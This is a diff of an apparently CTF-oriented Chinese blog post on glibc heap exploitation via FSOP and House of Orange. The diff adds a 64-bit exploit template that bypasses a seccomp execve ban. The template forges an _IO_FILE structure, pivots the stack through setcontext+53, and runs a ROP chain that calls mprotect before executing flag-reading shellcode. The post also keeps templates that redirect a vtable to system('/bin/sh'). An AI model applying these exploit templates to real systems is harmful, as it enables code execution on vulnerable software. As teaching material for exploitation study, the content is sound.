@@ -186,7 +186,7 @@ $7 = {
 
 见我的另一篇文章[https://sirhc.xyz/2018/11/06/House-of-orange/#fsop](https://sirhc.xyz/2018/11/06/House-of-orange/#fsop%E5%8E%9F%E7%90%86)
 
-64位的_IO_FILE_plus构造模板：
+* 64位的_IO_FILE_plus构造模板：
 
 ```python
 stream = "/bin/sh\x00"+p64(0x61)
@@ -199,7 +199,7 @@ stream += p64(0)
 stream += p64(vtable_addr)
 ```
 
-32位的_IO_FILE_plus构造模板：
+* 32位的_IO_FILE_plus构造模板：
 
 ```python
 stream = "sh\x00\x00"+p32(0x31)   # system_call_parameter and link to small_bin[4] 
@@ -211,6 +211,76 @@ stream += p32(0)
 stream += p32(0)
 stream += p32(vtable_addr)  # vtable_addr --> system
 ```
+* 64位下seccomp禁用execve系统调用的构造模板：
+
+```python
+    io_list_all = libc_base+libc.symbols['_IO_list_all']
+    setcontext = libc_base+libc.symbols['setcontext']
+    mprotect = libc_base+libc.symbols['mprotect']
+    Open = libc_base+libc.symbols['open']
+    Read = libc_base+libc.symbols['read']
+    Write = libc_base+libc.symbols['write']
+    pop_rdi_ret = 0x0000000000400d93
+    pop_rsi_ret = libc_base+0x00000000000202e8
+    pop_rdx_ret = libc_base+0x0000000000001b92
+    pop_rdi_rbp_ret = libc_base+0x0000000000020256
+    pop_three_ret = 0x0000000000400d8f
+    ret = 0x00000000004008d9
+
+    context.arch = 'amd64'
+    shellcode = asm(shellcraft.amd64.linux.cat('flag'))
+
+    rop = flat(
+        p64(pop_rdi_ret),
+        p64(current_io_chunk&~0xfff),
+        p64(pop_rsi_ret),
+        p64(0x1000),
+        p64(pop_rdx_ret),
+        p64(7),
+        p64(mprotect),
+    )
+
+    rop += p64(current_io_chunk+0x30+len(rop)+8)+shellcode
+    
+    fake_vtable = current_io_chunk+0xe0-0x18
+
+    payload = p64(0) + p64(0x61)
+    payload += p64(0xddaa) + p64(io_list_all-0x10)
+    payload += p64(2) + p64(3)
+    payload += rop
+    payload = payload.ljust(0xa0,'\x00')
+    payload += p64(current_io_chunk+0x30) #rsp
+    payload += p64(ret) # to rop
+    payload = payload.ljust(0xd8,'\x00')
+    payload += p64(fake_vtable)
+    payload += p64(setcontext+53) # 0xe0
+```
+
+将函数控制流控制在 setcontext+53 的位置，是因为这里正好可以修改 rsp 到我们的可控地址来进
+行 rop，在切栈之后就可以按照如上过程执行 rop。
+首先调用 mprotect 函数将 当前 heap 段设置为可执行，然后调用 cat flag 的 shellcode。
+
+```python 
+
+   0x7ffff77ef0a5 <setcontext+53>:	mov    rsp,QWORD PTR [rdi+0xa0]
+   0x7ffff77ef0ac <setcontext+60>:	mov    rbx,QWORD PTR [rdi+0x80]
+   0x7ffff77ef0b3 <setcontext+67>:	mov    rbp,QWORD PTR [rdi+0x78]
+   0x7ffff77ef0b7 <setcontext+71>:	mov    r12,QWORD PTR [rdi+0x48]
+   0x7ffff77ef0bb <setcontext+75>:	mov    r13,QWORD PTR [rdi+0x50]
+   0x7ffff77ef0bf <setcontext+79>:	mov    r14,QWORD PTR [rdi+0x58]
+   0x7ffff77ef0c3 <setcontext+83>:	mov    r15,QWORD PTR [rdi+0x60]
+   0x7ffff77ef0c7 <setcontext+87>:	mov    rcx,QWORD PTR [rdi+0xa8]
+   0x7ffff77ef0ce <setcontext+94>:	push   rcx
+   0x7ffff77ef0cf <setcontext+95>:	mov    rsi,QWORD PTR [rdi+0x70]
+   0x7ffff77ef0d3 <setcontext+99>:	mov    rdx,QWORD PTR [rdi+0x88]
+   0x7ffff77ef0da <setcontext+106>:	mov    rcx,QWORD PTR [rdi+0x98]
+   0x7ffff77ef0e1 <setcontext+113>:	mov    r8,QWORD PTR [rdi+0x28]
+   0x7ffff77ef0e5 <setcontext+117>:	mov    r9,QWORD PTR [rdi+0x30]
+   0x7ffff77ef0e9 <setcontext+121>:	mov    rdi,QWORD PTR [rdi+0x68]
+   0x7ffff77ef0ed <setcontext+125>:	xor    eax,eax
+   0x7ffff77ef0ef <setcontext+127>:	ret  
+```
+
 
 ## libc_2.24及以上的利用
 
